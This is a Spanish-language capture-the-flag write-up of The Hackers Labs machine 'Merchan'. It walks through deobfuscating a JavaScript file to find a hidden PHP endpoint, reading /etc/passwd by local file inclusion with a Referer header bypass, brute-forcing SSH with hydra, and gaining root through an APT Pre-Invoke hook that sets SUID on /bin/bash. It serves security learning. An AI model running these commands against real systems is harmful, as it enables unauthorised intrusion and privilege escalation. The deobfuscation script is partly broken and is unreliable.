---
Estado: Completado
Plataforma: The Hackers Labs
SO: Linux
Dificultad: Avanzado
VectorInicial: JavaScript Obfuscation → Hidden Endpoint → LFI
ServicioInicial: HTTP
PuertoInicial: 80
Credenciales:
  - julia: terror
Usuarios:
  - www-data
  - julia
  - root
Privesc:
  - Writable APT config
  - APT Pre-Invoke abuse
  - SUID bash
Tecnicas:
  - Virtual Host Discovery
  - JavaScript Deobfuscation
  - Hidden Endpoint Discovery
  - LFI (Local File Inclusion)
  - Header Bypass (Referer)
  - SSH Bruteforce
  - Privilege Escalation via APT hooks
Herramientas:
  - gomap
  - gobuster
  - ffuf
  - curl
  - hydra
  - linpeas
Fecha: 2026-04-07
---
<img width="336" height="335" alt="Pasted image 20260406130811" src="https://github.com/user-attachments/assets/d685ccf5-2360-4340-99ce-a369880dece2" />

Vamos a comenzar con el reconocimiento inicial de puertos y servicios para esta máquina.

```bash
 settarget 10.0.11.20   
TARGET establecido: 10.0.11.20

 gomap -s $TARGET                                                                             

  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
 ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
 ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
 ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
 ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝

🎯 Scanning 10.0.11.20 (996 ports, CONNECT scan)

PORT    STATE  SERVICE         VERSION
22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u4
80      open   http            Apache 2.4.62 (Debian)

Host Exposure Summary
- 10.0.11.20 | open ports: 2 | critical: ssh | exposure: medium

✓ Completed scan in 52ms | hosts: 1 | open ports: 2
```

Solo vemos dos puertos abiertos:
- 22 para conexión por **SHH**
- 80 para servicio web mediante *apache*

Veamos que tenemos en la web.

Al intentar entrar por la **IP** nos redirige al dominio `http://merchan.thl/` así que tendremos que añadirlo a nuestro `/etc/hosts`

```bash
 sudo nano /etc/hosts                                              

 cat /etc/hosts       
───────┬─────────────────────────────────────────────────────────────────────────       │ File: /etc/hosts
───────┼─────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   jd-sec.intracof.local   jd-sec
   3   │ 
   4   │ # The following lines are desirable for IPv6 capable hosts
   5   │ ::1     localhost ip6-localhost ip6-loopback
   6   │ ff02::1 ip6-allnodes
   7   │ ff02::2 ip6-allrouters
   8   │ 
   9   │ 10.0.11.20 merchan.thl
───────┴─────────────────────────────────────────────────────────────────────────
```

Ahora si podemos ver la web desde el navegador, pero nos encontramos con una tienda en la que no podemos interactuar.

<img width="1255" height="914" alt="Pasted image 20260406131637" src="https://github.com/user-attachments/assets/ca85c6b4-0f16-4d88-92f1-f6f9483195b1" />

Realizaremos un reconocimiento de directorios a ver si vemos algo interesante.

```bash
 gobuster dir -u http://merchan.thl/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,js -b 403,404
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://merchan.thl/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 311] [--> http://merchan.thl/images/]
index.html           (Status: 200) [Size: 7235]
assets               (Status: 301) [Size: 311] [--> http://merchan.thl/assets/]
css                  (Status: 301) [Size: 308] [--> http://merchan.thl/css/]
js                   (Status: 301) [Size: 307] [--> http://merchan.thl/js/]
secret.js            (Status: 200) [Size: 1365]
Progress: 1102785 / 1102785 (100.00%)
===============================================================
Finished
===============================================================
```

Aquí tenemos algo interesante, un fichero llamado `secret.js` el cual seguramente tenga contenido interesante, así que vamos a ver que tiene esto.

```javascript
function _0x19d3(){const _0x50f1a5=['appendChild','50BStDNV','createElement','1361605pdgKJX','innerText','284919wzilbs','11404485PwogyM','Haga\x20click\x20aqui','6fFDGab','4552444dWFnDv','body','4077605wHRazv','13116lpfaiO','href','6107952pEokeM'];_0x19d3=function(){return _0x50f1a5;};return _0x19d3();}(function(_0x238b54,_0x3b3052){const _0x9c06b6=_0x4b23,_0x16cfda=_0x238b54();while(!![]){try{const _0x304693=parseInt(_0x9c06b6(0x17e))/0x1+parseInt(_0x9c06b6(0x17a))/0x2*(-parseInt(_0x9c06b6(0x176))/0x3)+-parseInt(_0x9c06b6(0x173))/0x4+parseInt(_0x9c06b6(0x17c))/0x5+parseInt(_0x9c06b6(0x172))/0x6*(-parseInt(_0x9c06b6(0x175))/0x7)+parseInt(_0x9c06b6(0x178))/0x8+parseInt(_0x9c06b6(0x17f))/0x9;if(_0x304693===_0x3b3052)break;else _0x16cfda['push'](_0x16cfda['shift']());}catch(_0x52fac1){_0x16cfda['push'](_0x16cfda['shift']());}}}(_0x19d3,0xb90d5));function _0x4b23(_0x3b3f16,_0x489a45){const _0x19d34a=_0x19d3();return _0x4b23=function(_0x4b230b,_0x40eb5b){_0x4b230b=_0x4b230b-0x171;let _0x2e0997=_0x19d34a[_0x4b230b];return _0x2e0997;},_0x4b23(_0x3b3f16,_0x489a45);}function createLink(){const _0xd35862=_0x4b23,_0x398463='2e81eb4e952a3268babddecad2a4ec1e.php',_0x199a7f=document[_0xd35862(0x17b)]('a');_0x199a7f[_0xd35862(0x17d)]=_0xd35862(0x171),_0x199a7f[_0xd35862(0x177)]=_0x398463,document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);}createLink();
```

El contenido de este fichero esta **ofuscado** así que tendremos que volverlo a texto legible.

Si usamos alguna web de tipo [Beautifer](https://beautifier.io/) para ver el código ordenado veremos lo siguiente:

```javascript
function _0x19d3() {
    const _0x50f1a5 = ['appendChild', '50BStDNV', 'createElement', '1361605pdgKJX', 'innerText', '284919wzilbs', '11404485PwogyM', 'Haga\x20click\x20aqui', '6fFDGab', '4552444dWFnDv', 'body', '4077605wHRazv', '13116lpfaiO', 'href', '6107952pEokeM'];
    _0x19d3 = function() {
        return _0x50f1a5;
    };
    return _0x19d3();
}(function(_0x238b54, _0x3b3052) {
    const _0x9c06b6 = _0x4b23,
        _0x16cfda = _0x238b54();
    while (!![]) {
        try {
            const _0x304693 = parseInt(_0x9c06b6(0x17e)) / 0x1 + parseInt(_0x9c06b6(0x17a)) / 0x2 * (-parseInt(_0x9c06b6(0x176)) / 0x3) + -parseInt(_0x9c06b6(0x173)) / 0x4 + parseInt(_0x9c06b6(0x17c)) / 0x5 + parseInt(_0x9c06b6(0x172)) / 0x6 * (-parseInt(_0x9c06b6(0x175)) / 0x7) + parseInt(_0x9c06b6(0x178)) / 0x8 + parseInt(_0x9c06b6(0x17f)) / 0x9;
            if (_0x304693 === _0x3b3052) break;
            else _0x16cfda['push'](_0x16cfda['shift']());
        } catch (_0x52fac1) {
            _0x16cfda['push'](_0x16cfda['shift']());
        }
    }
}(_0x19d3, 0xb90d5));

function _0x4b23(_0x3b3f16, _0x489a45) {
    const _0x19d34a = _0x19d3();
    return _0x4b23 = function(_0x4b230b, _0x40eb5b) {
        _0x4b230b = _0x4b230b - 0x171;
        let _0x2e0997 = _0x19d34a[_0x4b230b];
        return _0x2e0997;
    }, _0x4b23(_0x3b3f16, _0x489a45);
}

function createLink() {
    const _0xd35862 = _0x4b23,
        _0x398463 = '2e81eb4e952a3268babddecad2a4ec1e.php',
        _0x199a7f = document[_0xd35862(0x17b)]('a');
    _0x199a7f[_0xd35862(0x17d)] = _0xd35862(0x171), _0x199a7f[_0xd35862(0x177)] = _0x398463, document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);
}
createLink();
```

Para desofuscar el `javascript` usaremos el siguiente script de Python:

```python
import re

def desofuscar_javascript(js_code):
    # Extraer el array de strings
    array_match = re.search(r"const\s+_0x[a-f0-9]+=$$(.*?)$$;", js_code, re.DOTALL)
    if not array_match:
        return "No se pudo encontrar el array de strings"
    
    array_content = array_match.group(1)
    # Extraer las cadenas del array
    strings = re.findall(r"'([^']*)'", array_content)
    
    # Extraer las funciones y el código principal
    main_code_match = re.search(r"function createLink$$$$\{.*?\}createLink$$$$;", js_code, re.DOTALL)
    if not main_code_match:
        return "No se pudo encontrar el código principal"
    
    main_code = main_code_match.group(0)
    
    # Extraer las referencias a las funciones de ofuscación
    ref_matches = re.findall(r"_0x[a-f0-9]+$$(0x[0-9a-f]+)$$", main_code)
    
    # Convertir los hexadecimales a decimales y obtener las strings correspondientes
    replacements = {}
    for match in ref_matches:
        hex_value = match
        dec_value = int(hex_value, 16)
        # Ajustar el índice (normalmente hay un offset en este tipo de ofuscación)
        adjusted_index = dec_value - 0x171
        if 0 <= adjusted_index < len(strings):
            replacements[hex_value] = strings[adjusted_index]
    
    # Reemplazar las referencias en el código principal
    desofuscado = main_code
    for hex_value, replacement in replacements.items():
        desofuscado = desofuscado.replace(f"_0x4b23({hex_value})", f"'{replacement}'")
    
    # Eliminar las definiciones de funciones de ofuscación
    desofuscado = re.sub(r"function _0x[a-f0-9]+$$$$\{.*?\}", "", desofuscado, flags=re.DOTALL)
    desofuscado = re.sub(r"$$function$$_0x[a-f0-9]+,_0x[a-f0-9]+$$\{.*?\}$$_0x[a-f0-9]+,0x[a-f0-9]+$$$$;", "", desofuscado, flags=re.DOTALL)
    desofuscado = re.sub(r"function _0x[a-f0-9]+$$_0x[a-f0-9]+,_0x[a-f0-9]+$$\{.*?\}", "", desofuscado, flags=re.DOTALL)
    
    # Limpiar el código
    desofuscado = re.sub(r"\s+", " ", desofuscado).strip()
    
    return desofuscado

# Código JavaScript ofuscado proporcionado
js_code = """
function _0x19d3(){const _0x50f1a5=['appendChild','50BStDNV','createElement','1361605pdgKJX','innerText','284919wzilbs','11404485PwogyM','Haga\\x20click\\x20aqui','6fFDGab','4552444dWFnDv','body','4077605wHRazv','13116lpfaiO','href','6107952pEokeM'];_0x19d3=function(){return _0x50f1a5;};return _0x19d3();}(function(_0x238b54,_0x3b3052){const _0x9c06b6=_0x4b23,_0x16cfda=_0x238b54();while(!![]){try{const _0x304693=parseInt(_0x9c06b6(0x17e))/0x1+parseInt(_0x9c06b6(0x17a))/0x2*(-parseInt(_0x9c06b6(0x176))/0x3)+-parseInt(_0x9c06b6(0x173))/0x4+parseInt(_0x9c06b6(0x17c))/0x5+parseInt(_0x9c06b6(0x172))/0x6*(-parseInt(_0x9c06b6(0x175))/0x7)+parseInt(_0x9c06b6(0x178))/0x8+parseInt(_0x9c06b6(0x17f))/0x9;if(_0x304693===_0x3b3052)break;else _0x16cfda['push'](_0x16cfda['shift']());}catch(_0x52fac1){_0x16cfda['push'](_0x16cfda['shift']());}}}(_0x19d3,0xb90d5));function _0x4b23(_0x3b3f16,_0x489a45){const _0x19d34a=_0x19d3();return _0x4b23=function(_0x4b230b,_0x40eb5b){_0x4b230b=_0x4b230b-0x171;let _0x2e0997=_0x19d34a[_0x4b230b];return _0x2e0997;},_0x4b23(_0x3b3f16,_0x489a45);}function createLink(){const _0xd35862=_0x4b23,_0x398463='2e81eb4e952a3268babddecad2a4ec1e.php',_0x199a7f=document[_0xd35862(0x17b)]('a');_0x199a7f[_0xd35862(0x17d)]=_0xd35862(0x171),_0x199a7f[_0xd35862(0x177)]=_0x398463,document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);}createLink();
"""

# Desofuscar el código
codigo_desofuscado = desofuscar_javascript(js_code)
print("Código desofuscado:")
print(codigo_desofuscado)

# Versión más legible
print("\n\nVersión más legible:")
print("""
function createLink() {
    const url = '2e81eb4e952a3268babddecad2a4ec1e.php';
    const linkElement = document.createElement('a');
    linkElement.innerText = 'Haga click aqui';
    linkElement.href = url;
    document.body.appendChild(linkElement);
}
createLink();
""")
```

Con este script obtendremos el siguiente resultado:

```bash
 python3 DesOfus.py secret.js
Código desofuscado:
No se pudo encontrar el array de strings


Versión más legible:

function createLink() {
    const url = '2e81eb4e952a3268babddecad2a4ec1e.php';
    const linkElement = document.createElement('a');
    linkElement.innerText = 'Haga click aqui';
    linkElement.href = url;
    document.body.appendChild(linkElement);
}
```

Podemos ver que se crea un botón con el cual se llevara a un `.php` que es posible que sea un *payload* para un *webshell* ponemos la url a ver si tenemos suerte.

```http
http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php
```

Al intentar entrar en la url nos encontramos que no es posible acceder ya que nos arroja un `403 forbidden`.

Veamos si haciendo un poco de *fuzzing* nos saltamos esta limitación.

```bash
 ffuf -u 'http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -H 'Referer: http://merchan.thl/' --fs=0 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Header           : Referer: http://merchan.thl/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 1187, Words: 27, Lines: 23, Duration: 1ms]
:: Progress: [4750/4750] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Parece que hemos encontrado algo, veamos si desde la web nos muestra algo.

```http
http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?file=/etc/passwd
```

Pero seguimos con `403 forbidden` así que probemos con *curl*.

```bash
 curl -H 'Referer: http://merchan.thl/' 'http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash<br />
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />
sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />
sync:x:4:65534:sync:/bin:/bin/sync<br />
games:x:5:60:games:/usr/games:/usr/sbin/nologin<br />
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br />
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br />
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br />
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br />
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br />
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br />
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin<br />
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br />
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin<br />
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin<br />
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin<br />
julia:x:1001:1001:,,,:/home/julia:/bin/bash<br />
```

Desde aquí ya podemos hacernos una idea de los usuarios que tiene el sistema.

Intentemos hacer un *fuzzing* de la carpeta `/home/julia` antes de intentar forzar la contraseña, pero no conseguimos nada así que intentaremos un ataque de diccionario contra *ssh*.

```bash
 hydra -I -l julia -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-06 16:41:11
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://10.0.11.20:22/
[STATUS] 98.00 tries/min, 98 tries in 00:01h, 14344301 to do in 2439:31h, 5 active
[STATUS] 91.00 tries/min, 273 tries in 00:03h, 14344126 to do in 2627:08h, 5 active
[STATUS] 92.57 tries/min, 648 tries in 00:07h, 14343751 to do in 2582:28h, 5 active
[STATUS] 91.00 tries/min, 1365 tries in 00:15h, 14343034 to do in 2626:56h, 5 active
[STATUS] 90.55 tries/min, 2807 tries in 00:31h, 14341592 to do in 2639:46h, 5 active
[STATUS] 90.40 tries/min, 4249 tries in 00:47h, 14340150 to do in 2643:43h, 5 active
[STATUS] 88.84 tries/min, 5597 tries in 01:03h, 14338802 to do in 2689:58h, 5 active
[STATUS] 88.73 tries/min, 7010 tries in 01:19h, 14337389 to do in 2692:57h, 5 active
[22][ssh] host: 10.0.11.20   login: julia   password: terror
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-06 18:00:21
```

Como ya tenemos el usuario y la contraseña nos conectaremos por **ssh** y empezaremos la búsqueda de **flags** y la escalada de privilegios.

```bash
 ssh julia@$TARGET                                                 
The authenticity of host '10.0.11.20 (10.0.11.20)' can't be established.
ED25519 key fingerprint is: SHA256:/dj9ohObCGh3uxVDezGgQaWdTH9jy23c99WyAkiAg+s
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.11.20' (ED25519) to the list of known hosts.
julia@10.0.11.20's password: 
Linux Thehackerslabs-merchan 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
julia@Thehackerslabs-merchan:~$ 
```

La primera búsqueda con `sudo -l` no da frutos.

```bash
julia@Thehackerslabs-merchan:~$ sudo -l
sudo: unable to resolve host Thehackerslabs-merchan: Nombre o servicio desconocido
[sudo] contraseña para julia: 
Sorry, user julia may not run sudo on Thehackerslabs-merchan.
julia@Thehackerslabs-merchan:~$ 
```

Seguiremos probando con `SUID` a ver si encontramos algo.

```bash
julia@Thehackerslabs-merchan:~$ find / -perm -4000 2>/dev/null 
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
julia@Thehackerslabs-merchan:~$ 
```

Pero tampoco es que veamos nada de interés, en los procesos tampoco vemos nada, así que tendremos que recurrir a `linpeas`.

```bash
 scp ./linpeas.sh julia@$TARGET:/tmp/
julia@10.0.11.20's password: 
linpeas.sh
```

Una vez subido al sistema lo ejecutamos y esperamos a ver que nos ofrece.

```bash
julia@Thehackerslabs-merchan:~$ /tmp/linpeas.sh 



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look into it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 6.1.0-30-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12)
User & Groups: uid=1001(julia) gid=1001(julia) grupos=1001(julia),100(users)
Hostname: Thehackerslabs-merchan

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)

<skip>

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/etc/apt/apt.conf.d
/home/julia
/run/lock
/run/user/1001
/run/user/1001/dbus-1
/run/user/1001/dbus-1/services
/run/user/1001/systemd
/run/user/1001/systemd/inaccessible
/run/user/1001/systemd/inaccessible/dir
/run/user/1001/systemd/inaccessible/reg
/run/user/1001/systemd/units
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.X11-unix
/tmp/.XIM-unix
/var/lib/php/sessions
/var/tmp

<skip>

╔══════════╣ Log files with potentially weak perms (limit 50)
   262655      8 -rw-r-----   1 root     adm                 7437 ene 24  2025 /var/log/apt/term.log.1.gz
   262624      0 -rw-r-----   1 root     adm                    0 abr  6 13:08 /var/log/apt/term.log
   
<skip>
```

Parece que tenemos permisos de escritura en algún que otro fichero interesante.
- `/etc/apt/apt.conf.d`

Gracias a que podemos editar los `APT` podremos inyectar un comando que nos permita obtener una `shell` con privilegios de `root`.

```bash
julia@Thehackerslabs-merchan:~$ echo 'APT::Update::Pre-Invoke {"chmod +s /bin/bash";};' > /etc/apt/apt.conf.d/pwn
```

Ahora esperamos un poco hasta que `/bin/bash` tenga activo el `SUID` con la siguiente actualización automática y podremos conseguir el acceso como `root`.

```bash
julia@Thehackerslabs-merchan:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
julia@Thehackerslabs-merchan:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 mar 29  2024 /bin/bash
julia@Thehackerslabs-merchan:~$ bash -p
bash-5.2# whoami
root
bash-5.2# 
```

Con esto daríamos por terminado el laboratorio.

Ha sido muy interesante como hemos tenido que encontrar un `javascript` ofuscado, sacar algo en claro de el y obtener datos desde `curl` para saltarnos una limitación del servidor.

Una vez conectados el usar `apt` para escalar privilegios ha sido una sorpresa, pero muy interesante.
